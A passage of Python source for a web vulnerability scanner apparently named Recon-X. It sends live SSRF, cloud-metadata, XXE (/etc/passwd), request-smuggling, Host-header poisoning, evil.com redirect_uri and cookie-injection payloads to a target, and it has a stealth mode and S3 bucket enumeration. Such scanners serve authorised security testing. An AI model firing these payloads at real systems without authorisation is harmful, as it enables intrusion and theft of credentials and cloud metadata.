                "param": param_name, "payload": payload,
                "status": r.get("status", 0), "crlf_found": crlf_found,
                "vulnerable": crlf_found
            })
            if crlf_found:
                break
    return results

# ================= SSRF DETECTION =================
SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "local-ipv4", "public-ipv4",
    "root:", "bin/bash", "metadata", "169.254",
]

def test_ssrf(url, timeout=8):
    """Live: test URL parameters for SSRF."""
    parsed = urlparse(url)
    params = parsed.query
    if not params:
        params = "url=http://example.com&redirect=http://example.com&next=http://example.com"
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    param_list = []
    for p in params.split("&"):
        if "=" in p:
            k, v = p.split("=", 1)
            param_list.append((k, v))
    if not param_list:
        param_list = [("url", "http://example.com"), ("redirect", "http://example.com")]
    
    # Only test params that look like URL params
    url_params = [p for p in param_list if any(kw in p[0].lower() for kw in ("url", "redirect", "next", "target", "dest", "link", "src", "fetch", "load", "path"))]
    if not url_params:
        url_params = param_list[:2]
    
    results = []
    for param_name, original_val in url_params:
        for payload in SSRF_PAYLOADS[:4]:
            test_url = f"{base}?{param_name}={quote(payload, safe='')}"
            r = http_request(test_url, timeout=timeout)
            body = (r.get("body") or "").lower()
            ssrf_found = any(sig in body for sig in SSRF_SIGNATURES)
            results.append({
                "param": param_name, "payload": payload,
                "status": r.get("status", 0), "ssrf_found": ssrf_found,
                "vulnerable": ssrf_found
            })
            if ssrf_found:
                break
    return results

# ================= XXE DETECTION =================
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
]

XXE_SIGNATURES = [
    "root:", "bin/bash", "bin/sh", "daemon:", "nobody:",
]

def test_xxe(url, timeout=8):
    """Live: test for XML External Entity injection."""
    results = []
    for payload in XXE_PAYLOADS:
        r = http_request(url, method="POST", timeout=timeout,
                         headers={"Content-Type": "application/xml"},
                         data=payload)
        body = (r.get("body") or "").lower()
        xxe_found = any(sig in body for sig in XXE_SIGNATURES)
        results.append({
            "payload": payload[:60], "status": r.get("status", 0),
            "xxe_found": xxe_found, "vulnerable": xxe_found
        })
        if xxe_found:
            break
    return results

# ================= JWT DEEP ANALYSIS =================
def analyze_jwt(token):
    """Live: decode JWT and check for security issues (no signature verification)."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        import base64
        header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        issues = []
        alg = header.get("alg", "").upper()
        if alg == "NONE":
            issues.append("Algorithm 'none' - signature bypass possible")
        if alg.startswith("HS"):
            issues.append(f"HMAC algorithm ({alg}) - possible key confusion")
        if not header.get("typ"):
            issues.append("Missing 'typ' header")
        # Check expiry
        exp = payload.get("exp")
        if exp:
            import datetime as _dt
            exp_date = _dt.datetime.fromtimestamp(exp)
            if exp_date < _dt.datetime.now():
                issues.append(f"Token expired ({exp_date.isoformat()})")
            else:
                issues.append(f"Token expires: {exp_date.isoformat()}")
        else:
            issues.append("No 'exp' claim - token never expires")
        if payload.get("admin") is True or payload.get("role") == "admin":
            issues.append("Admin privileges in token")
        return {"header": header, "payload": payload, "algorithm": alg,
                "issues": issues, "expired": exp and _dt.datetime.fromtimestamp(exp) < _dt.datetime.now()}
    except Exception as e:
        return {"error": str(e)}

def scan_jwt_tokens(resp):
    """Live: find and analyze JWT tokens in response."""
    if not resp or not resp.get("ok"):
        return []
    body = resp.get("body") or ""
    headers = resp.get("headers") or {}
    haystack = body + "\n" + "\n".join(f"{k}: {v}" for k, v in headers.items())
    jwt_pat = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")
    tokens = set(jwt_pat.findall(haystack))
    results = []
    for t in tokens:
        analysis = analyze_jwt(t)
        if analysis:
            results.append({"token": t[:40] + "...", "analysis": analysis})
    return results

# ================= HOST HEADER ATTACK (DEEP) =================
def test_host_header_deep(url, timeout=8):
    """Live: deep host header attacks (password reset poisoning, cache poisoning)."""
    findings = []
    attacker = "evil-reconx-host.invalid"
    # Password reset poisoning
    r = http_request(url, timeout=timeout, headers={"Host": attacker}, allow_redirects=False)
    body = (r.get("body") or "").lower()
    loc = ((r.get("headers") or {}).get("location") or "").lower()
    if attacker in body or attacker in loc:
        findings.append({"attack": "Host header reflection", "header": "Host",
                        "value": attacker, "reflected": True,
                        "status": r.get("status", 0)})
    # X-Forwarded-Host (cache poisoning)
    r = http_request(url, timeout=timeout, headers={"X-Forwarded-Host": attacker},
                     allow_redirects=False)
    body = (r.get("body") or "").lower()
    loc = ((r.get("headers") or {}).get("location") or "").lower()
    if attacker in body or attacker in loc:
        findings.append({"attack": "X-Forwarded-Host reflection", "header": "X-Forwarded-Host",
                        "value": attacker, "reflected": True,
                        "status": r.get("status", 0)})
    # X-Forwarded-Proto (HTTP to HTTPS redirect bypass)
    r = http_request(url, timeout=timeout, headers={"X-Forwarded-Proto": "https"},
                     allow_redirects=False)
    if r.get("status") in (200, 301, 302):
        findings.append({"attack": "X-Forwarded-Proto bypass", "header": "X-Forwarded-Proto",
                        "value": "https", "reflected": False,
                        "status": r.get("status", 0)})
    return findings

# ================= COOKIE INJECTION =================
def test_cookie_injection(url, timeout=8):
    """Live: test if server accepts and reflects arbitrary cookies."""
    findings = []
    test_cookies = [
        "session=reconx_injected",
        "admin=true",
        "role=admin",
        "user_id=1",
        "auth=1",
    ]
    for cookie in test_cookies:
        r = http_request(url, timeout=timeout, headers={"Cookie": cookie},
                         allow_redirects=False)
        body = (r.get("body") or "").lower()
        reflected = cookie.split("=")[1].lower() in body
        findings.append({"cookie": cookie, "reflected": reflected,
                         "status": r.get("status", 0)})
    return findings

# ================= SESSION FIXATION =================
def test_session_fixation(url, timeout=8):
    """Live: check if session ID changes after a request (session fixation)."""
    r1 = http_request(url, timeout=timeout, allow_redirects=True)
    hdrs1 = r1.get("headers") or {}
    cookies1 = hdrs1.get("set-cookie", "")
    
    # Second request with the same session
    r2 = http_request(url, timeout=timeout, headers={"Cookie": cookies1.split(";")[0] if cookies1 else ""},
                      allow_redirects=True)
    hdrs2 = r2.get("headers") or {}
    cookies2 = hdrs2.get("set-cookie", "")
    
    # Check if session ID is the same (fixation vulnerability)
    sid1 = None
    sid2 = None
    for c in [cookies1, cookies2]:
        if "session" in c.lower() or "sid" in c.lower() or "jsessionid" in c.lower():
            parts = c.split(";")[0].split("=")
            if len(parts) == 2:
                if sid1 is None:
                    sid1 = parts[1]
                else:
                    sid2 = parts[1]
    
    fixed = (sid1 is not None and sid1 == sid2)
    return {"session_id_1": sid1, "session_id_2": sid2,
            "session_fixation": fixed, "cookies_1": cookies1[:100],
            "cookies_2": cookies2[:100]}

# ================= CONTENT-TYPE SNIFFING =================
def test_content_type_sniffing(url, timeout=8):
    """Live: check if server sends X-Content-Type-Options: nosniff."""
    r = http_request(url, timeout=timeout)
    hdrs = r.get("headers") or {}
    xcto = hdrs.get("x-content-type-options", "")
    ct = hdrs.get("content-type", "")
    sniffing_possible = (xcto.lower() != "nosniff")
    return {"content_type": ct, "x_content_type_options": xcto,
            "sniffing_possible": sniffing_possible}

# ================= CORS (DEEP) =================
# ================= CLOUD METADATA SSRF =================
def test_cloud_metadata(url, timeout=8):
    """Live: test for cloud metadata SSRF (169.254.169.254)."""
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
    ]
    results = []
    parsed = urlparse(url)
    params = parsed.query
    if not params:
        params = "url=http://example.com&redirect=http://example.com"
    param_list = []
    for p in params.split("&"):
        if "=" in p:
            k, v = p.split("=", 1)
            param_list.append((k, v))
    url_params = [p for p in param_list if any(kw in p[0].lower() for kw in ("url", "redirect", "next", "target", "dest", "link", "src", "fetch", "load", "path", "file"))]
    if not url_params:
        url_params = param_list[:2]
    
    for param_name, original_val in url_params:
        for payload in payloads[:2]:
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}?{param_name}={quote(payload, safe='')}"
            r = http_request(test_url, timeout=timeout)
            body = (r.get("body") or "").lower()
            meta_found = any(sig in body for sig in ("ami-id", "instance-id", "local-ipv4", "public-ipv4", "project-id", "zone"))
            results.append({"param": param_name, "payload": payload,
                            "status": r.get("status", 0), "metadata_found": meta_found,
                            "vulnerable": meta_found})
            if meta_found:
                break
    return results

# ================= OAUTH/OIDC MISCONFIGURATION =================
def test_oauth(url, timeout=8):
    """Live: test OAuth/OIDC endpoints for misconfigurations."""
    parsed = urlparse(url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
                   "/.well-known/openid-configuration", "/oauth/token",
                   "/oauth2/token", "/auth/token", "/connect/token"]
    results = []
    for path in oauth_paths:
        r = http_request(root + path, timeout=timeout, allow_redirects=False)
        status = r.get("status", 0)
        body = r.get("body") or ""
        # Check for redirect_uri validation bypass
        if "authorize" in path:
            test_url = f"{root}{path}?client_id=test&redirect_uri=https://evil.com&response_type=code"
            r2 = http_request(test_url, timeout=timeout, allow_redirects=False)
            loc = (r2.get("headers") or {}).get("location", "")
            redirect_bypass = "evil.com" in loc
            results.append({"path": path, "status": status,
                            "redirect_uri_bypass": redirect_bypass,
                            "location": loc[:100] if loc else ""})
        elif "openid-configuration" in path:
            if status == 200 and "issuer" in body:
                results.append({"path": path, "status": status,
                                "openid_config": True, "body_preview": body[:200]})
            else:
                results.append({"path": path, "status": status, "openid_config": False})
        else:
            results.append({"path": path, "status": status})
    return results

# ================= S3 BUCKET ENUMERATION (DEEP) =================
def test_s3_deep(domain, timeout=8):
    """Live: deep S3 bucket enumeration with ACL and listing checks."""
    base = domain.split(".")[0].lower()
    candidates = {base, domain.replace(".", "-"), domain.replace(".", ""),
                  base + "-backup", base + "-dev", base + "-staging",
                  base + "-assets", base + "-static", base + "-media",
                  base + "-uploads", base + "-files", base + "-data",
                  base + "-logs", base + "-test", base + "-prod",
                  base + "-assets", base + "assets", base + "backup",
                  base + "dev", base + "staging", base + "prod"}
    results = []
    for name in candidates:
        # Test bucket listing
        url = f"https://{name}.s3.amazonaws.com"
        r = http_request(url, timeout=timeout)
        status = r.get("status", 0)
        body = r.get("body") or ""
        listable = (status == 200 and "<listbucketresult" in body.lower())
        acl_url = f"https://{name}.s3.amazonaws.com/?acl"
        r2 = http_request(acl_url, timeout=timeout)
        acl_exposed = (r2.get("status", 0) == 200)
        if status not in (0, 404):
            results.append({"bucket": name, "url": url, "status": status,
                            "listable": listable, "acl_exposed": acl_exposed})
    # dedupe
    seen = set()
    out = []
    for r in results:
        if r["url"] not in seen:
            seen.add(r["url"])
            out.append(r)
    return out

# ================= TECHNOLOGY VERSION DETECTION =================
def detect_tech_versions(resp):
    """Live: extract version numbers from technology fingerprints."""
    if not resp or not resp.get("ok"):
        return []
    headers = resp.get("headers") or {}
    body = resp.get("body") or ""
    haystack = " ".join(f"{k}: {v}" for k, v in headers.items()) + "\n" + body
    versions = []
    # PHP
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "PHP", "version": m.group(1)})
    # Apache
    m = re.search(r"Apache/(\d+\.\d+\.\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "Apache", "version": m.group(1)})
    # Nginx
    m = re.search(r"nginx/(\d+\.\d+\.\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "Nginx", "version": m.group(1)})
    # IIS
    m = re.search(r"Microsoft-IIS/(\d+\.\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "IIS", "version": m.group(1)})
    # ASP.NET
    m = re.search(r"ASP\.NET Version:(\d+\.\d+\.\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "ASP.NET", "version": m.group(1)})
    # WordPress
    m = re.search(r"WordPress\s+(\d+\.\d+(?:\.\d+)?)", haystack, re.I)
    if m:
        versions.append({"tech": "WordPress", "version": m.group(1)})
    # jQuery
    m = re.search(r"jquery[.-](\d+\.\d+\.\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "jQuery", "version": m.group(1)})
    # Bootstrap
    m = re.search(r"bootstrap[.-](\d+\.\d+\.\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "Bootstrap", "version": m.group(1)})
    # OpenSSL
    m = re.search(r"OpenSSL/(\d+\.\d+\.\d+[a-z]?)", haystack, re.I)
    if m:
        versions.append({"tech": "OpenSSL", "version": m.group(1)})
    # Express
    m = re.search(r"Express/(\d+\.\d+\.\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "Express", "version": m.group(1)})
    # Django
    m = re.search(r"Django/(\d+\.\d+(?:\.\d+)?)", haystack, re.I)
    if m:
        versions.append({"tech": "Django", "version": m.group(1)})
    # Laravel
    m = re.search(r"Laravel/(\d+\.\d+(?:\.\d+)?)", haystack, re.I)
    if m:
        versions.append({"tech": "Laravel", "version": m.group(1)})
    # Drupal
    m = re.search(r"Drupal\s+(\d+)", haystack, re.I)
    if m:
        versions.append({"tech": "Drupal", "version": m.group(1)})
    return versions

# ================= DNS REBINDING CHECK =================
def check_dns_rebinding(host, timeout=8):
    """Live: check if DNS rebinding might be possible (short TTL)."""
    out = {"ttl": None, "rebinding_possible": False, "details": ""}
    if not HAS_DNS:
        out["details"] = "dnspython not installed"
        return out
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 8
        answer = resolver.resolve(host, "A")
        if answer.rrset and answer.rrset.ttl:
            out["ttl"] = answer.rrset.ttl
            if answer.rrset.ttl < 60:
                out["rebinding_possible"] = True
                out["details"] = f"TTL is very short ({answer.rrset.ttl}s) - rebinding possible"
            else:
                out["details"] = f"TTL: {answer.rrset.ttl}s (normal)"
    except Exception as e:
        out["details"] = str(e)
    return out

# ================= RUNNERS =================

def run_sqli(ctx, url, args):
    p_section("SQL Injection Probe", "52")
    ctx["modules_run"].append("sqli")
    res = test_sqli(url, timeout=args.timeout)
    ctx["sqli"] = res
    vulns = [r for r in res if r["vulnerable"]]
    if vulns:
        for r in vulns:
            p_bad(r["param"], f"SQLi ({'error' if r['error_found'] else 'time-based'}) via '{r['payload']}'")
    else:
        p_ok("SQLi", f"no injection found across {len(res)} tests")

def run_cmdi(ctx, url, args):
    p_section("Command Injection Probe", "53")
    ctx["modules_run"].append("cmdi")
    res = test_cmdi(url, timeout=args.timeout)
    ctx["cmdi"] = res
    vulns = [r for r in res if r["vulnerable"]]
    if vulns:
        for r in vulns:
            p_bad(r["param"], f"CMDi via '{r['payload']}'")
    else:
        p_ok("CMDi", f"no injection found across {len(res)} tests")

def run_lfi(ctx, url, args):
    p_section("Path Traversal / LFI Probe", "54")
    ctx["modules_run"].append("lfi")
    res = test_lfi(url, timeout=args.timeout)
    ctx["lfi"] = res
    vulns = [r for r in res if r["vulnerable"]]
    if vulns:
        for r in vulns:
            p_bad(r["param"], f"LFI via '{r['payload']}'")
    else:
        p_ok("LFI", f"no traversal found across {len(res)} tests")

def run_crlf(ctx, url, args):
    p_section("CRLF Injection Probe", "55")
    ctx["modules_run"].append("crlf")
    res = test_crlf(url, timeout=args.timeout)
    ctx["crlf"] = res
    vulns = [r for r in res if r["vulnerable"]]
    if vulns:
        for r in vulns:
            p_bad(r["param"], f"CRLF injection via '{r['payload']}'")
    else:
        p_ok("CRLF", f"no injection found across {len(res)} tests")

def run_ssrf(ctx, url, args):
    p_section("SSRF Detection", "56")
    ctx["modules_run"].append("ssrf")
    res = test_ssrf(url, timeout=args.timeout)
    ctx["ssrf"] = res
    vulns = [r for r in res if r["vulnerable"]]
    if vulns:
        for r in vulns:
            p_bad(r["param"], f"SSRF via '{r['payload']}'")
    else:
        p_ok("SSRF", f"no SSRF found across {len(res)} tests")

def run_xxe(ctx, url, args):
    p_section("XXE Detection", "57")
    ctx["modules_run"].append("xxe")
    res = test_xxe(url, timeout=args.timeout)
    ctx["xxe"] = res
    vulns = [r for r in res if r["vulnerable"]]
    if vulns:
        for r in vulns:
            p_bad("XXE", "XXE injection possible")
    else:
        p_ok("XXE", "no XXE found")

def run_jwt(ctx, url, args):
    p_section("JWT Deep Analysis", "58")
    ctx["modules_run"].append("jwt")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("JWT", "not measured - no HTTP response")
        ctx["jwt"] = []
        return
    res = scan_jwt_tokens(resp)
    ctx["jwt"] = res
    if res:
        for r in res:
            a = r["analysis"]
            if "error" in a:
                p_warn("JWT", f"parse error: {a['error']}")
            else:
                p_warn("JWT", f"algorithm: {a.get('algorithm', '?')}")
                for issue in a.get("issues", []):
                    p_bad("  issue", issue)
    else:
        p_ok("JWT", "no JWT tokens found in response")

def run_host_header_deep(ctx, url, args):
    p_section("Host Header Attack (Deep)", "59")
    ctx["modules_run"].append("host_header_deep")
    res = test_host_header_deep(url, timeout=args.timeout)
    ctx["host_header_deep"] = res
    if res:
        for r in res:
            p_bad(r["attack"], f"{r['header']}: {r['value']} (HTTP {r['status']})")
    else:
        p_ok("Host header (deep)", "no reflection/bypass found")

def run_cookie_injection(ctx, url, args):
    p_section("Cookie Injection", "60")
    ctx["modules_run"].append("cookie_injection")
    res = test_cookie_injection(url, timeout=args.timeout)
    ctx["cookie_injection"] = res
    reflected = [r for r in res if r["reflected"]]
    if reflected:
        for r in reflected:
            p_bad(r["cookie"], "REFLECTED in response")
    else:
        p_ok("Cookie injection", "no cookies reflected")

def run_session_fixation(ctx, url, args):
    p_section("Session Fixation", "61")
    ctx["modules_run"].append("session_fixation")
    res = test_session_fixation(url, timeout=args.timeout)
    ctx["session_fixation"] = res
    if res.get("session_fixation"):
        p_bad("Session", "session ID not changed (fixation possible)")
    else:
        p_ok("Session", "session ID changed or no session cookie")

def run_content_type_sniff(ctx, url, args):
    p_section("Content-Type Sniffing", "62")
    ctx["modules_run"].append("content_type_sniff")
    res = test_content_type_sniffing(url, timeout=args.timeout)
    ctx["content_type_sniff"] = res
    if res["sniffing_possible"]:
        p_warn("Sniffing", f"possible (X-Content-Type-Options: {res['x_content_type_options'] or 'missing'})")
    else:
        p_ok("Sniffing", "nosniff present")

def run_cors_deep2(ctx, url, args):
    p_section("CORS Deep Testing", "63")
    ctx["modules_run"].append("cors_deep2")
    res = test_cors_deep(url, timeout=args.timeout)
    ctx["cors_deep2"] = res
    dangerous = [r for r in res if r["dangerous"]]
    if dangerous:
        for r in dangerous:
            p_bad(r["origin"], "DANGEROUS: reflected + credentials")
    else:
        reflected = [r for r in res if r["reflected"]]
        if reflected:
            for r in reflected:
                p_warn(r["origin"], f"reflected (acao={r['acao']}) but no credentials")
        else:
            p_ok("CORS deep", "no origin reflection across " + str(len(res)) + " tests")

def run_cloud_metadata(ctx, url, args):
    p_section("Cloud Metadata SSRF", "64")
    ctx["modules_run"].append("cloud_metadata")
    res = test_cloud_metadata(url, timeout=args.timeout)
    ctx["cloud_metadata"] = res
    vulns = [r for r in res if r["vulnerable"]]
    if vulns:
        for r in vulns:
            p_bad(r["param"], "cloud metadata accessible via SSRF")
    else:
        p_ok("Cloud metadata", "no SSRF found")

def run_oauth(ctx, url, args):
    p_section("OAuth/OIDC Misconfiguration", "65")
    ctx["modules_run"].append("oauth")
    res = test_oauth(url, timeout=args.timeout)
    ctx["oauth"] = res
    bypass = [r for r in res if r.get("redirect_uri_bypass")]
    if bypass:
        for r in bypass:
            p_bad(r["path"], "redirect_uri bypass possible")
    configs = [r for r in res if r.get("openid_config")]
    if configs:
        for r in configs:
            p_ok(r["path"], "OpenID configuration found")
    if not bypass and not configs:
        p_ok("OAuth", "no OAuth/OIDC endpoints found or misconfigured")

def run_s3_deep(ctx, host, args):
    p_section("S3 Bucket Enumeration (Deep)", "66")
    ctx["modules_run"].append("s3_deep")
    if is_ip(host):
        p_note("S3 deep", "not measured - target is an IP")
        ctx["s3_deep"] = []
        return
    res = test_s3_deep(host, timeout=args.timeout)
    ctx["s3_deep"] = res
    if res:
        for r in res:
            flags = []
            if r.get("listable"):
                flags.append("LISTABLE")
            if r.get("acl_exposed"):
                flags.append("ACL EXPOSED")
            p_bad(r["bucket"], " -> ".join(flags) if flags else "exists (HTTP " + str(r["status"]) + ")")
    else:
        p_ok("S3 deep", "no buckets found")

def run_tech_versions(ctx, url, args):
    p_section("Technology Version Detection", "67")
    ctx["modules_run"].append("tech_versions")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Tech versions", "not measured - no HTTP response")
        ctx["tech_versions"] = []
        return
    res = detect_tech_versions(resp)
    ctx["tech_versions"] = res
    if res:
        for r in res:
            p_ok(r["tech"], r["version"])
    else:
        p_ok("Tech versions", "no version numbers detected")

def run_dns_rebinding(ctx, host, args):
    p_section("DNS Rebinding Check", "68")
    ctx["modules_run"].append("dns_rebinding")
    if is_ip(host):
        p_note("DNS rebinding", "not measured - target is an IP")
        ctx["dns_rebinding"] = None
        return
    res = check_dns_rebinding(host, timeout=args.timeout)
    ctx["dns_rebinding"] = res
    if res["rebinding_possible"]:
        p_bad("DNS rebinding", res["details"])
    else:
        p_ok("DNS rebinding", res["details"])

# ================= PROXY / STEALTH / THROTTLE RUNNER =================
def run_proxy_stealth(ctx, args):
    global PROXY_URL
    p_section("Proxy / Stealth / Throttle", "69")
    ctx["modules_run"].append("proxy_stealth")
    # Check environment
    proxy = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy") or os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")
    if proxy:
        PROXY_URL = proxy
        _apply_proxy()
        p_ok("Proxy", proxy)
    else:
        p_note("Proxy", "not configured (set HTTP_PROXY/HTTPS_PROXY env vars)")
    if STEALTH_MODE:
        p_ok("Stealth mode", "enabled (randomized delays 0.5-2.5s)")
    else:
        p_note("Stealth mode", "disabled (use --stealth flag)")
    if THROTTLE_DELAY > 0:
        p_ok("Throttle", f"{THROTTLE_DELAY}s delay between requests")
    else:
        p_note("Throttle", "disabled (use --delay N)")

# ================= RESUME / DIFF SUPPORT =================
def save_scan_state(ctx, filepath):
    """Save scan state for resume capability."""
    try:
        state = {"timestamp": datetime.datetime.now().isoformat(),
                 "target": ctx.get("target"), "url": ctx.get("url"),
                 "modules_run": ctx.get("modules_run", []),
                 "partial": True}
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2, default=str)
        return True
    except Exception:
        return False

def load_scan_state(filepath):
    """Load saved scan state."""
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None

def diff_scans(scan1_path, scan2_path):
    """Compare two scan reports and show differences."""
    try:
        s1 = json.load(open(scan1_path, encoding="utf-8"))
        s2 = json.load(open(scan2_path, encoding="utf-8"))
    except Exception as e:
        return {"error": str(e)}
    diff = {"added": [], "removed": [], "changed": []}
    # Compare open ports
    p1 = set(s1.get("open_ports", []))
    p2 = set(s2.get("open_ports", []))
    if p1 != p2:
        diff["added"].append({"field": "open_ports", "added": sorted(p2 - p1), "removed": sorted(p1 - p2)})
    # Compare exposed paths
    e1 = {p.get("path") for p in (s1.get("exposed_paths") or [])}
    e2 = {p.get("path") for p in (s2.get("exposed_paths") or [])}
    if e1 != e2:
        diff["added"].append({"field": "exposed_paths", "added": sorted(e2 - e1), "removed": sorted(e1 - e2)})
    # Compare score
    sc1 = (s1.get("score") or {}).get("percent", 0)
    sc2 = (s2.get("score") or {}).get("percent", 0)
    if sc1 != sc2:
        diff["changed"].append({"field": "score_percent", "old": sc1, "new": sc2})
    # Compare vuln count
    v1 = len(s1.get("vuln_inventory", []) or [])
    v2 = len(s2.get("vuln_inventory", []) or [])
    if v1 != v2:
        diff["changed"].append({"field": "vuln_count", "old": v1, "new": v2})
    # Compare subdomains
    sub1 = {s.get("name") if isinstance(s, dict) else str(s) for s in (s1.get("subdomains") or [])}
    sub2 = {s.get("name") if isinstance(s, dict) else str(s) for s in (s2.get("subdomains") or [])}
    if sub1 != sub2:
        diff["added"].append({"field": "subdomains", "added": sorted(sub2 - sub1), "removed": sorted(sub1 - sub2)})
    return diff

# ================= MULTI-TARGET SCAN =================
def run_multi_target(targets, args):
    """Scan multiple targets sequentially."""
    results = []
    for i, target in enumerate(targets, 1):
        p_section(f"Target {i}/{len(targets)}: {target}", ">>")
        # Reuse main logic by calling run functions
        # For simplicity, just run a quick scan per target
        url = normalize_url(target)
        if not url:
            continue
        host = get_host(url)
        if not host:
            continue
        parsed = urlparse(url)
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        ctx = {"target": target, "url": url, "host": host, "modules_run": [],
               "open_ports": [], "exposed_paths": [], "dns_ips": []}
        # Run key modules only for multi-target
        for name, fn in [("http", lambda: run_http(ctx, url, args)),
                         ("tls", lambda: run_tls(ctx, host, port, args)),
                         ("headers", lambda: run_headers(ctx, url, args)),
                         ("paths", lambda: run_paths(ctx, url, args) if args.paths else None),
                         ("score", lambda: run_score(ctx))]:
            try:
                fn()
            except Exception as e:
                p_warn(f"module {name}", str(e))
        results.append({"target": target, "url": url, "score": ctx.get("score")})
    return results

# ================= HTTP REQUEST SMUGGLING (CL.TE / TE.CL) =================
def test_http_smuggling(url, timeout=10):
    """Live: probe for HTTP request smuggling (CL.TE and TE.CL)."""
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    results = []
    
    # CL.TE probe: send Content-Length and Transfer-Encoding together
    # If the server processes CL first, the TE body is treated as a separate request
    cl_te_payload = (
        f"POST {parsed.path or '/'} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"1\r\n"
        f"Z\r\n"
        f"0\r\n"
        f"\r\n"
    )
    
    # TE.CL probe: send Transfer-Encoding and Content-Length together
    te_cl_payload = (
        f"POST {parsed.path or '/'} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: 6\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"X"
    )
    
    for name, payload in [("CL.TE", cl_te_payload), ("TE.CL", te_cl_payload)]:
        try:
            import ssl as _s
            if parsed.scheme == "https":
                ctx = _s.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _s.CERT_NONE
                with socket.create_connection((host, port), timeout=timeout) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as ss:
                        ss.sendall(payload.encode())
                        time.sleep(2)
                        data = ss.recv(4096)
            else:
                with socket.create_connection((host, port), timeout=timeout) as sock:
                    sock.sendall(payload.encode())
                    time.sleep(2)
                    data = sock.recv(4096)
            text = data.decode("utf-8", errors="ignore")
            # If we get a 400 or the connection behaves differently, might be vulnerable
            vulnerable = ("400" in text or "500" in text or 
                          "transfer-encoding" in text.lower() or
                          len(text) > 100)
            results.append({"type": name, "status_line": text.split("\r\n")[0] if text else "",
                            "response_length": len(text), "vulnerable": vulnerable,
                            "raw_preview": text[:200]})
        except Exception as e:
            results.append({"type": name, "status_line": "", "response_length": 0,
                            "vulnerable": False, "error": clean_error(e)})
    return results

# ================= PROXY SUPPORT =================
def configure_proxy(proxy_url):
    """Configure HTTP/SOCKS proxy for all requests."""
    global PROXY_URL
    if proxy_url:
        PROXY_URL = proxy_url
        os.environ["HTTP_PROXY"] = proxy_url
        os.environ["HTTPS_PROXY"] = proxy_url
        os.environ["http_proxy"] = proxy_url
        os.environ["https_proxy"] = proxy_url
        # For SOCKS proxies
        if proxy_url.startswith("socks"):
            try:
                import socks
                import socket as _socket
                # Parse proxy URL
                from urllib.parse import urlparse as _up
                parsed = _up(proxy_url)
                socks.set_default_proxy(socks.SOCKS5, parsed.hostname, parsed.port or 1080)
                _socket.socket = socks.socksocket
            except ImportError:
                pass  # PySocks not installed
        return True
    return False

# ================= HTML REPORT EXPORT =================
def export_html_report(ctx, filepath):
    """Export scan results as an HTML report with charts and styling."""
    score = ctx.get("score", {}) or {}
    vulns = ctx.get("vuln_inventory", []) or []
    
    # Count severities
    from collections import Counter
    sev_counts = Counter(v.get("severity", "Info") for v in vulns)
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Recon-X Report - {ctx.get('target', 'Unknown')}</title>
<style>
body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }}
.container {{ max-width: 1200px; margin: 0 auto; }}
h1 {{ color: #58a6ff; border-bottom: 2px solid #58a6ff; padding-bottom: 10px; }}
h2 {{ color: #79c0ff; margin-top: 30px; }}
h3 {{ color: #a5d6ff; }}
.card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin: 10px 0; }}
.score {{ font-size: 48px; font-weight: bold; text-align: center; padding: 20px; }}
.grade-A {{ color: #3fb950; }} .grade-B {{ color: #58a6ff; }} .grade-C {{ color: #d29922; }}
.grade-D {{ color: #f85149; }} .grade-F {{ color: #f85149; }}
.vuln {{ border-left: 4px solid; padding: 10px; margin: 5px 0; background: #161b22; }}
